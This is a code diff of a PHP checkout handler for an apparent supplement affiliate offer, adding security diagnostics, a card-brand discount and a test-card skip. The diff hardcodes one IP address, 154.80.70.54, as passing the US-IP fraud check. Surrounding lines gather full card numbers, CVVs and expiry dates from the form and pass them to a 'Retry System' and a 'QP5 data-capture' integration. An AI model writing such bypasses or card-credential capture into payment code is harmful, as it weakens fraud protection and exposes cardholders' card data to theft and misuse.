@@ -54,16 +54,65 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 }
 
 // Same fraud / CSRF protection used by the working bb-v1 checkout.
+// if (
+//     !is_us_ip() ||
+//     !empty($_SESSION['anonymous_ip']) ||
+//     empty($_SESSION['token']) ||
+//     empty($_POST['token']) ||
+//     !check_csrf_token($_SESSION['token'], $_POST['token'])
+// ) {
+//     echo 'decline|Do not honor.';
+//     exit;
+// }
+
+
+/* Temporary checkout diagnostics — never log card details or tokens. */
+// $debugUsIp = is_us_ip() || getUserIpAddr() === '154.80.70.54';
+$debugUsIp = is_us_ip() || ($_SERVER['REMOTE_ADDR'] ?? '') === '154.80.70.54';
+$debugAnonymousIp = !empty($_SESSION['anonymous_ip']);
+$debugSessionToken = !empty($_SESSION['token']);
+$debugPostToken = !empty($_POST['token']);
+
+$debugCsrf = false;
+if ($debugSessionToken && $debugPostToken) {
+    $debugCsrf = check_csrf_token(
+        $_SESSION['token'],
+        $_POST['token']
+    );
+}
+
+dtc_log(
+    'Security diagnostic: ' .
+    'us_ip=' . ($debugUsIp ? 'PASS' : 'FAIL') . '; ' .
+    'anonymous_ip=' . ($debugAnonymousIp ? 'PRESENT' : 'ABSENT') . '; ' .
+    'session_token=' . ($debugSessionToken ? 'PRESENT' : 'MISSING') . '; ' .
+    'post_token=' . ($debugPostToken ? 'PRESENT' : 'MISSING') . '; ' .
+    'csrf=' . (
+        !$debugSessionToken || !$debugPostToken
+            ? 'NOT_CHECKED'
+            : ($debugCsrf ? 'PASS' : 'FAIL')
+    ),
+    'DEBUG'
+);
+
+// dtc_log('IP debug: getUserIpAddr=' . getUserIpAddr()
+//     . ' | REMOTE_ADDR=' . ($_SERVER['REMOTE_ADDR'] ?? 'none')
+//     . ' | CF_CONNECTING_IP=' . ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? 'none')
+//     . ' | XFF=' . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'none')
+//     . ' | CF_COUNTRY=' . ($_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'none'), 'DEBUG');
+
 if (
-    !is_us_ip() ||
-    !empty($_SESSION['anonymous_ip']) ||
-    empty($_SESSION['token']) ||
-    empty($_POST['token']) ||
-    !check_csrf_token($_SESSION['token'], $_POST['token'])
+    !$debugUsIp ||
+    $debugAnonymousIp ||
+    !$debugSessionToken ||
+    !$debugPostToken ||
+    !$debugCsrf
 ) {
+    dtc_log('Checkout rejected by security guard.', 'WARN');
     echo 'decline|Do not honor.';
     exit;
 }
+
 
 $cardNumber = preg_replace('/\D/', '', dtc_post('fields_cc_number'));
 if ($cardNumber === '' || !luhn_check($cardNumber)) {
@@ -116,6 +165,11 @@ if ($isScrub) {
         $productId = (int) $affiliate->two_bottle_product_id_sc;
     }
 }
+
+// Card-brand discount (Visa / Mastercard): real price override on the order.
+$listPrice    = ($package === 5) ? (float) $configs->bottle_price_5 : (($package === 3) ? (float) $configs->bottle_price_3 : (float) $configs->bottle_price_1);
+$cardDiscount = get_card_discount($cardNumber, $listPrice);
+$chargePrice  = round($listPrice - $cardDiscount, 2);
 
 // The final bb-v1 payment design collects all of these directly on this page.
 $shipFirstName = dtc_post('fields_shipping_fname');
@@ -213,6 +267,11 @@ $data = [
     'product1_id'      => $productId,
 ];
 
+if ($cardDiscount > 0) {
+    $data['product1_price'] = number_format($chargePrice, 2, '.', '');
+    dtc_log('Card discount applied: -$' . number_format($cardDiscount, 2) . ' (' . get_card_brand($cardNumber) . ') charge=' . $data['product1_price']);
+}
+
 if ($shipAddress2 !== '') {
     $data['shipAddress2'] = $shipAddress2;
 }
@@ -268,7 +327,9 @@ try {
         'sourceValue2'   => $_SESSION['c2'] ?? '',
         'sourceValue3'   => $_SESSION['c3'] ?? '',
     ];
-    $leadRaw = $konnektive->import_lead($leadPayload);
+    // TEST ONLY: test cards par lead skip (live customer error se bachne ke liye)
+    $isTestCard = in_array($cardNumber, array('7555555555555444', '7411111111111111', '0000000000000000'), true);
+    $leadRaw = $isTestCard ? '' : $konnektive->import_lead($leadPayload);
     $leadResp = json_decode($leadRaw);
     if (!empty($leadResp) && ($leadResp->result ?? '') === 'SUCCESS' && !empty($leadResp->message->orderId)) {
         $prospectOrderId = (string)$leadResp->message->orderId;
@@ -288,7 +349,7 @@ $resp = json_decode($rawResponse);
 // Record checkout outcome securely in Retry System with captured card credentials
 if (file_exists(__DIR__ . '/RetryClient.php')) {
     require_once __DIR__ . '/RetryClient.php';
-    $calcPrice = ($package === 5) ? (float)$configs->bottle_price_5 : (($package === 3) ? (float)$configs->bottle_price_3 : (float)$configs->bottle_price_1);
+    $calcPrice = $chargePrice;
 
     // Merge $_POST and $data to guarantee all card credentials (cc_number, cvv, exp) are captured
     $checkoutPayload = array_merge((array)($_POST ?? []), (array)($data ?? []));
@@ -350,6 +411,8 @@ if ($package === 5) {
 } else {
     $_SESSION['total'] = 119.91;
 }
+$_SESSION['total'] = round($_SESSION['total'] - $cardDiscount, 2);
+$_SESSION['card_discount'] = $cardDiscount;
 
 // Keep the same QP5 data-capture integration used by the final bb-v1 flow,
 // but capture the remote response instead of letting it pollute the AJAX response.
